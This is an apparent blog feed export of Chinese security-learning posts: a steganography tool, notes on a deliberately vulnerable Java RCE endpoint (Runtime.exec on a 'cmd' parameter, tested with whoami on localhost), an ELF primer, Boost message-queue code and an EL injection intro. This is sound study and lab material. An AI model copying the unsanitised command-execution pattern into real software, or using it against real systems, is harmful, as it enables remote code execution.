class="line">plt.axis([0, len(avgR), 0, 1])</span><br><span class="line">plt.ylabel(&#39;Average LSB per block&#39;)</span><br><span class="line">plt.xlabel(&#39;Block number&#39;)</span><br><span class="line"></span><br><span class="line">#plt.plot(blocks, avgR, &#39;r.&#39;)</span><br><span class="line">#plt.plot(blocks, avgG, &#39;g&#39;)</span><br><span class="line">plt.plot(blocks, avgB, &#39;bo&#39;)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">def usage(progName):</span><br><span class="line">print &quot;LSB steganogprahy. Hide files within least significant bits of images.\n&quot;</span><br><span class="line">print &quot;Usage:&quot;</span><br><span class="line">print &quot;  %s hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;&quot; % progName</span><br><span class="line">print &quot;  %s extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;&quot; % progName</span><br><span class="line">print &quot;  %s analyse &lt;stego_file&gt;&quot; % progName</span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">if len(sys.argv) &lt; 3:</span><br><span class="line">usage(sys.argv[0])</span><br><span class="line"></span><br><span class="line">if sys.argv[1] &#x3D;&#x3D; &quot;hide&quot;:</span><br><span class="line">embed(sys.argv[2], sys.argv[3], sys.argv[4])</span><br><span class="line">elif sys.argv[1] &#x3D;&#x3D; &quot;extract&quot;:</span><br><span class="line">extract(sys.argv[2], sys.argv[3], sys.argv[4])</span><br><span class="line">elif sys.argv[1] &#x3D;&#x3D; &quot;analyse&quot;:</span><br><span class="line">analyse(sys.argv[2])</span><br><span class="line">else:</span><br><span class="line">print &quot;[-] Invalid operation specified&quot;</span><br></pre></td></tr></table></figure><p>crypto.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from Crypto import Random</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">Thanks to</span><br><span class="line">http:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;12524994&#x2F;encrypt-decrypt-using-pycrypto-aes-256</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">class AESCipher:</span><br><span class="line"></span><br><span class="line">    def __init__(self, key): </span><br><span class="line">        self.bs &#x3D; 32# Block size</span><br><span class="line">        self.key &#x3D; hashlib.sha256(key.encode()).digest()# 32 bit digest</span><br><span class="line"></span><br><span class="line">    def encrypt(self, raw):</span><br><span class="line">        raw &#x3D; self._pad(raw)</span><br><span class="line">        iv &#x3D; Random.new().read(AES.block_size)</span><br><span class="line">        cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return iv + cipher.encrypt(raw)</span><br><span class="line"></span><br><span class="line">    def decrypt(self, enc):</span><br><span class="line">        iv &#x3D; enc[:AES.block_size]</span><br><span class="line">        cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        return self._unpad(cipher.decrypt(enc[AES.block_size:]))</span><br><span class="line"></span><br><span class="line">    def _pad(self, s):</span><br><span class="line">        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def _unpad(s):</span><br><span class="line">        return s[:-ord(s[len(s)-1:])]</span><br></pre></td></tr></table></figure><h2 id="bmp"><a href="#bmp" class="headerlink" title="bmp"></a>bmp</h2><p>在工具集-隐写-PDF隐写，使用wbStego4.3，选择decode，然后选择bmp, 打开bmp文件，continue后输入密码123456，continue后输入生成的文件1.txt. 之后continue就行。打开1.txt即可。</p><p><img src="https://i.loli.net/2021/02/02/obDCS4tJkvKjRIU.png" alt="image-20210202233000695"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;之前报名了涅普高校计划，白嫖了一个零组的邀请码。昨天开始讲课，在此总结一下。&lt;/p&gt;
&lt;h1 id=&quot;MISC简介&quot;&gt;&lt;a href=&quot;#MISC简介&quot; class=&quot;headerlink&quot; title=&quot;MISC简介&quot;&gt;&lt;/a&gt;MISC简介&lt;/h1&gt;&lt;p&gt;miscella
      
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-misc（一）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>java-sec-code-学习（二）</title>
    <link href="https://ggyggy666.github.io/2021/01/29/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/01/29/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-01-29T09:17:08.000Z</published>
    <updated>2021-01-29T10:54:43.254Z</updated>
    
    <content type="html"><![CDATA[<p>昨天配置好了环境，今天就来学习一下RCE。</p><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p><code>http://localhost:8080/java-sec/rce/exec?cmd=whoami</code></p><p>即可看到输出了用户名。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public String CommandExec(String cmd) &#123;</span><br><span class="line">       Runtime run &#x3D; Runtime.getRuntime();</span><br><span class="line">       StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">       try &#123;</span><br><span class="line">           Process p &#x3D; run.exec(cmd);</span><br><span class="line">           BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">           BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">           String tmpStr;</span><br><span class="line"></span><br><span class="line">           while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">               sb.append(tmpStr);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><ol><li>定义了一个CommandExec类，输入是cmd，字符串类型。</li><li>定义一个Runtime类型的run, 为了让其调用exec从而执行命令。即<code>run.exec(cmd)</code></li><li>定义了一个字符串序列对象sb, 它有：<strong>append()、insert()、reverse()、setCharAt()、setLength()等方法</strong>，最终使用toString()方法返回</li><li>try部分，先是定义一个Process类，创建一个进程来执行命令。然后定义一个BufferedInputStream对象来获取进程输出的内容并放到缓冲区中，之后使用BufferedReader来读取缓冲区中的内容。使用readLine()一行一行读取，如果读取的内容非空就放到sb中。这个过程就相当于将子进程执行的命令后输出的内容添加到字符串对象sb中，最后使用return sb.toString()输出就行了。</li></ol><p><img src="https://i.loli.net/2021/01/29/kfKFStAb4PJh3N7.png" alt="image-20210129182051837"></p><p>注意到后面的p.waitFor()，其实是process创建子进程后，为了让子进程完全执行命令获得输出，主进程就需要等待，因此需要p.waitFor。返回值是0说明子进程已经执行成功，如果非0就出现了问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">inBr.close();</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure><p>执行完毕记得需要关闭缓冲区读取与读入。</p><h1 id="先知Java-RCE学习"><a href="#先知Java-RCE学习" class="headerlink" title="先知Java RCE学习"></a>先知Java RCE学习</h1><p>文章：<code>https://xz.aliyun.com/t/7995</code></p><p>下载好源码后，使用IDEA打开。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天配置好了环境，今天就来学习一下RCE。&lt;/p&gt;
&lt;h1 id=&quot;运行&quot;&gt;&lt;a href=&quot;#运行&quot; class=&quot;headerlink&quot; title=&quot;运行&quot;&gt;&lt;/a&gt;运行&lt;/h1&gt;&lt;p&gt;&lt;code&gt;http://localhost:8080/java-sec/rce/
      
    
    </summary>
    
    
      <category term="java安全" scheme="https://ggyggy666.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="java-sec-code-学习（二）" scheme="https://ggyggy666.github.io/tags/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>java-sec-code-学习（二）</title>
    <link href="https://ggyggy666.github.io/2021/01/29/%C2%96java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/01/29/%C2%96java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-01-29T09:17:08.000Z</published>
    <updated>2021-01-29T09:18:55.918Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
      <category term="java-sec-code-学习（二）" scheme="https://ggyggy666.github.io/tags/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>java-sec-code 学习（一）</title>
    <link href="https://ggyggy666.github.io/2021/01/28/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/01/28/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-01-28T04:39:40.000Z</published>
    <updated>2021-01-28T08:29:58.884Z</updated>
    
    <content type="html"><![CDATA[<p>放假回到家了，开始学习java漏洞。</p><h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md</a></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><ol><li><p>在Windows的git下，使用命令：</p><p><code>git clone https://github.com/JoyChou93/java-sec-code &amp; cd java-sec-code</code></p><p>将源代码下载下来。</p></li><li><p>进入到java-sec-code目录后，右键打开powershell, 执行:  <code>mvn clean package</code>, 注意，没有mvn的需要安装mvn并添加到环境变量中。</p><p><img src="https://i.loli.net/2021/01/28/8Z6A3KiY5TPlDFW.png" alt="image-20210128145324331"></p><p>发现没有编译器，出错了。原因是pom.xml中没有指定我们本地的java环境的JDK。</p></li><li><p>参考了<code>https://blog.csdn.net/qq_40685457/article/details/103888830</code>, 在pom.xml中加东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">               &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;</span><br><span class="line">               &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">               &lt;version&gt;3.1&lt;&#x2F;version&gt;</span><br><span class="line">               &lt;configuration&gt;</span><br><span class="line">                   &lt;verbose&gt;true&lt;&#x2F;verbose&gt;</span><br><span class="line">                   &lt;fork&gt;true&lt;&#x2F;fork&gt;</span><br><span class="line">                   &lt;source&gt;1.8&lt;&#x2F;source&gt;</span><br><span class="line">                   &lt;target&gt;1.8&lt;&#x2F;target&gt;</span><br><span class="line">                   &lt;executable&gt;D:&#x2F;jdk1.8&#x2F;bin&#x2F;javac&lt;&#x2F;executable&gt;</span><br><span class="line">               &lt;&#x2F;configuration&gt;</span><br><span class="line">           &lt;&#x2F;plugin&gt;</span><br></pre></td></tr></table></figure></li><li><p>继续执行<code>mvn clean package</code></p><p><img src="https://i.loli.net/2021/01/28/tLWbyDTRaSx7s3r.png" alt="image-20210128145810643"></p><p>又报错了，无法执行编译器。注意到版本号是3.1。</p></li><li><p>参考了<code>https://blog.csdn.net/maker6/article/details/107707407</code>, 不过是改成3.1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt;</span><br><span class="line">                &lt;version&gt;3.1&lt;&#x2F;version&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;source&gt;1.8&lt;&#x2F;source&gt;</span><br><span class="line">                    &lt;target&gt;1.8&lt;&#x2F;target&gt;</span><br><span class="line">                &lt;&#x2F;configuration&gt;</span><br><span class="line">            &lt;&#x2F;plugin&gt;</span><br></pre></td></tr></table></figure><p>还是报错了。</p></li><li><p>最后，指定了另一个JDK就好了。（上面的在pom.xml里加的都没有用。。）</p><p>原来的JDK：</p><p><img src="https://i.loli.net/2021/01/28/1ad3rC68qyDEWZ5.png" alt="image-20210128160538177"></p><p>另一个JDK：</p><p><img src="https://i.loli.net/2021/01/28/ReF1r69iBbS5hlD.png" alt="image-20210128160515968"></p><p>可以看到原来的JDK其实是不完整的。</p></li><li><p>还要注意，在IDEA里运行需要配置Tomcat，就需要在deployment中+一个.war包。默认是没有的。首先需要到pom.xml中的开头将jar修改成war，之后点击IDEA的左下角</p><p><img src="/2021/01/28/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/C:%5CUsers%5CASUS%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210128162533686.png" alt="image-20210128162533686"></p><p>看到右侧的package，双击，等待一段时间后会生成一个.war包，然后将其复制到tomacat的webapps目录下。在Tomcat配置的deployment中+</p><p><img src="https://i.loli.net/2021/01/28/YB3gTO5HWaVmufw.png" alt="image-20210128162943072"></p><p>之后便可运行了。</p></li><li><p>打开链接：<code>http://localhost:8080/java_sec_code_1_0_0_war/</code>,即可看到登录界面</p><p><img src="https://i.loli.net/2021/01/28/8WPylpjLm9BkCIS.png" alt="image-20210128162831286"></p><p>使用：admin/admin123登录成功。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;放假回到家了，开始学习java漏洞。&lt;/p&gt;
&lt;h1 id=&quot;项目地址&quot;&gt;&lt;a href=&quot;#项目地址&quot; class=&quot;headerlink&quot; title=&quot;项目地址&quot;&gt;&lt;/a&gt;项目地址&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/JoyChou9
      
    
    </summary>
    
    
      <category term="java安全" scheme="https://ggyggy666.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="java-sec-code 学习（一）" scheme="https://ggyggy666.github.io/tags/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门-ELF文件格式</title>
    <link href="https://ggyggy666.github.io/2021/01/17/pwn%E5%85%A5%E9%97%A8-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    <id>https://ggyggy666.github.io/2021/01/17/pwn%E5%85%A5%E9%97%A8-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</id>
    <published>2021-01-17T10:40:23.000Z</published>
    <updated>2021-01-18T02:20:12.076Z</updated>
    
    <content type="html"><![CDATA[<p>放假了，开始学习新的东西。昨天和今天在XCTF上混了一下，发现pwn的CTF题目好难，还是得好好学习一下。</p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>ELF，Executable and Linking Format。是Linux系统上的主要可执行文件格式。</p><h1 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h1><ul><li>可重定位文件：有代码和数据，用于与其他目标文件一起链接得到可执行文件，就是gcc -c后得到的编译之后的文件。</li><li>可执行文件：包含了程序创建进程映像所需要的东西。</li><li>共享目标文件：可以被链接，也可以执行。</li></ul><h1 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h1><p><img src="https://i.loli.net/2021/01/17/aZW82LdAHBeybhq.png" alt="image-20210117184640788"></p><p>ELF包括header、sections、header。而第一个header又包括ELF header 和 Program Header table. sections包括代码code和数据data还有每个Section的名字；最后的header代表Section Header table。下面一一分析：</p><p><img src="https://i.loli.net/2021/01/17/ZE4cu32JHqINt16.png" alt="image-20210117184858085"></p><p>通常的结构如上图。</p><ul><li>ELF header：记录了整个ELF文件的结构信息。</li><li>Program header table：描述文件中的各种section节的信息，告诉系统如何创建进程。</li><li>sections:  各种section节，包含代码节和数据节、符号和字符串等。针对链接过程，可以忽略Program header table，Section header table必须存在；针对运行过程，可以忽略Section header table，Program header table必须存在。如果是用于链接的，必须要有这个sections。</li><li>Section header table：包含了各个section节的信息。每个section在这里都有一个表项。</li></ul><p>之所以说section是节而不是段，是因为ELF文件是保存在磁盘中，是在外存的。运行时被装入内存中，各个节才会组成段segment。</p><p><img src="https://i.loli.net/2021/01/17/mp4NuDyqMJf2HKs.png" alt="image-20210117194820455"></p><h1 id="ELF-header"><a href="#ELF-header" class="headerlink" title="ELF header"></a>ELF header</h1><p>结构如下：</p><p><img src="https://i.loli.net/2021/01/17/7KxhMv6UIRWaeOF.png" alt="image-20210117185819036"></p><ul><li>e_ident: 判断是否是ELF文件，文件首部存在4个字节：0x7F,’E’,’L’,’F’。</li><li>e_type: 指定文件类型，主要有ET_REL、ET_EXEC、ET_DYN三种。</li><li>e_maching: 描述elf文件支持的体系结构。EM_386和EM_X86_64.</li><li>e_version：描述版本。</li><li>e_entry: 程序入口的虚拟地址。</li><li>e_phoff: program header table在文件中的位置（偏移）。</li><li>e_shoff: section header table在文件中的位置（偏移）。</li><li>e_flags: 保存与文件关联的特点处理器的标志。</li><li>e_ehsize: ELF header的大小。</li><li>e_phentsize: program header table的每个表项的大小。</li><li>e_phnum: program header table表项个数。</li><li>e_shentsize: section header table的每个表项的大小。</li><li>e_shnum: section header table表项个数。</li><li>e_shstrndx: 表示字符串表这个section在section header table中的索引。</li></ul><h1 id="磁盘ELF文件与内存ELF映像"><a href="#磁盘ELF文件与内存ELF映像" class="headerlink" title="磁盘ELF文件与内存ELF映像"></a>磁盘ELF文件与内存ELF映像</h1><p><img src="https://i.loli.net/2021/01/17/j9UgFBtHDR37Aeb.png" alt="image-20210117195030411"></p><p>RW是指有可读可写的权限，节共有：.data, .bss, .got.plt，它们在内存中组合成了数据段。</p><p>RX是指有可读可执行的权限，节共有：.rodata, .text, .init, ELF Header, 它们在内存中组合成了代码段。</p><p>为什么rodata也是在代码段之中？因为它没有写权限。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;放假了，开始学习新的东西。昨天和今天在XCTF上混了一下，发现pwn的CTF题目好难，还是得好好学习一下。&lt;/p&gt;
&lt;h1 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h1&gt;&lt;p&gt;ELF，Execu
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://ggyggy666.github.io/categories/pwn/"/>
    
    
      <category term="pwn入门-ELF文件格式" scheme="https://ggyggy666.github.io/tags/pwn%E5%85%A5%E9%97%A8-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>MQ队列-C++实现</title>
    <link href="https://ggyggy666.github.io/2021/01/01/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/"/>
    <id>https://ggyggy666.github.io/2021/01/01/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/</id>
    <published>2021-01-01T08:24:29.000Z</published>
    <updated>2021-01-01T10:06:53.898Z</updated>
    
    <content type="html"><![CDATA[<p>由于实验需要用到实时监控，使得一个进程输出内容时，另一个进程能接收到，因此开始学习进程间的通信——MQ队列。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>MQ队列，其实就是生产者和消费者模型的实现。二者共享一块内存，生产者产出数据放到内存中，消费者从中取出数据。</p><h1 id="安装boost库"><a href="#安装boost库" class="headerlink" title="安装boost库"></a>安装boost库</h1><p>如果是源代码安装，会很麻烦并且可能最后根本就安装不成功。可以直接一条命令：</p><p><code>apt-get install libboost-dev</code></p><h1 id="生产者"><a href="#生产者" class="headerlink" title="生产者"></a>生产者</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;boost&#x2F;interprocess&#x2F;ipc&#x2F;message_queue.hpp&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">char MessageStr[100]&#x3D;&quot;Hello World&quot;;</span><br><span class="line">&#x2F;&#x2F;先把之前的队列清除</span><br><span class="line">boost::interprocess::message_queue::remove(&quot;Message_Queue&quot;);</span><br><span class="line">&#x2F;&#x2F;创建一个消息队列,create_only</span><br><span class="line">boost::interprocess::message_queue My_mq(boost::interprocess::create_only, &quot;Message_Queue&quot;, 100, sizeof(MessageStr));</span><br><span class="line">&#x2F;&#x2F;发送100条消息</span><br><span class="line">for (int i &#x3D; 0; i &lt; 10; i++)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;Please input the Send Message:&quot;;</span><br><span class="line">std::string data;</span><br><span class="line">std::getline(std::cin, data);&#x2F;&#x2F;输入要发送的消息</span><br><span class="line">memcpy(MessageStr, data.c_str(),sizeof(data));&#x2F;&#x2F;根据消息的大小分配内存空间</span><br><span class="line">std::cout &lt;&lt; MessageStr &lt;&lt; std::endl;</span><br><span class="line">My_mq.send(&amp;MessageStr, sizeof(MessageStr), 0); &#x2F;&#x2F;发送消息</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">catch (boost::interprocess::interprocess_exception&amp; e)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; e.what() &lt;&lt; std::endl;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，即使include了那个message_queue.hpp头文件，还是需要在变量前使用：<code>boost::interprocess::</code>。而且编译时使用g++, 还要注意使用<code>-pthread -lrt</code>，否则会出错：</p><p><code>g++ produce.cpp -o produce -pthread -lrt</code></p><h1 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;cstring&gt;</span><br><span class="line">#include&lt;boost&#x2F;interprocess&#x2F;ipc&#x2F;message_queue.hpp&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">char MessageStr[100] &#x3D; &quot;Hello World&quot;;</span><br><span class="line">&#x2F;&#x2F;打开消息队列，open_only</span><br><span class="line">boost::interprocess::message_queue My_mq(boost::interprocess::open_only, &quot;Message_Queue&quot;);</span><br><span class="line">&#x2F;&#x2F;定义一个优先级</span><br><span class="line">unsigned priority;</span><br><span class="line">&#x2F;&#x2F;定义一个接收的数据的大小</span><br><span class="line">boost::interprocess::message_queue::size_type received_size;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;接收消息并输出</span><br><span class="line">while (true)</span><br><span class="line">&#123;</span><br><span class="line">My_mq.receive(&amp;MessageStr, sizeof(MessageStr), received_size, priority);</span><br><span class="line">std::cout &lt;&lt; &quot;Recive Message:&quot; &lt;&lt; MessageStr &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">catch (boost::interprocess::interprocess_exception&amp; e)</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; e.what() &lt;&lt; std::endl;</span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求跟生产者一样。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;由于实验需要用到实时监控，使得一个进程输出内容时，另一个进程能接收到，因此开始学习进程间的通信——MQ队列。&lt;/p&gt;
&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;MQ队列，其实就
      
    
    </summary>
    
    
      <category term="MQ队列-C++实现" scheme="https://ggyggy666.github.io/categories/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/"/>
    
    
      <category term="MQ队列-C++实现" scheme="https://ggyggy666.github.io/tags/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>表达式注入--EL表达式</title>
    <link href="https://ggyggy666.github.io/2020/12/25/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://ggyggy666.github.io/2020/12/25/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2020-12-25T11:56:27.000Z</published>
    <updated>2020-12-25T12:55:54.238Z</updated>
    
    <content type="html"><![CDATA[<p>好久没更新博客了，今天有空来学习一下EL表达式注入。</p><h1 id="EL概述"><a href="#EL概述" class="headerlink" title="EL概述"></a>EL概述</h1><p>EL是一种语言，为了简化JSP的写法。它的功能有四个：</p><ul><li>获取数据：替换JSP页面的脚本表达式，使用<code>${user}</code>等形式获取数据。</li><li>执行运算：在JSP页面执行一些基本的运算，如：<code>${100-99}</code>，执行后页面应该返回1.</li><li>获取对象：EL表达式定义了一些隐式对象，通过EL获取对象之后就可以直接访问其中数据。</li><li>调用JAVA方法：可以通过<code>${np: 函数名(参数)}</code>调用方法，np是值命名空间。</li></ul><h1 id="JSP形式"><a href="#JSP形式" class="headerlink" title="JSP形式"></a>JSP形式</h1><ul><li>JSP表达式：&lt;%=变量或表达式%&gt;</li><li>JSP脚本：&lt;%JAVA代码%&gt;</li><li>JSP声明：&lt;%!变量或方法%&gt;</li><li>JSP注释：&lt;%!–JSP注释–%&gt;</li></ul><h1 id="EL的使用"><a href="#EL的使用" class="headerlink" title="EL的使用"></a>EL的使用</h1><h2 id="查找变量值返回"><a href="#查找变量值返回" class="headerlink" title="查找变量值返回"></a>查找变量值返回</h2><p>想要获取某个变量的值：<code>${username}</code>, 但是这个username没有指定范围，不知道它是哪里的username（默认是在page)。这时候就得涉及到EL的查找范围了。</p><ul><li>page，页面范围内，使用pageScope去调用访问，如：<code>${pageScope.username}</code>, 还有：<code>${pageScope.objectName.attributeName}</code>, 访问某个对象的属性。</li><li>request, 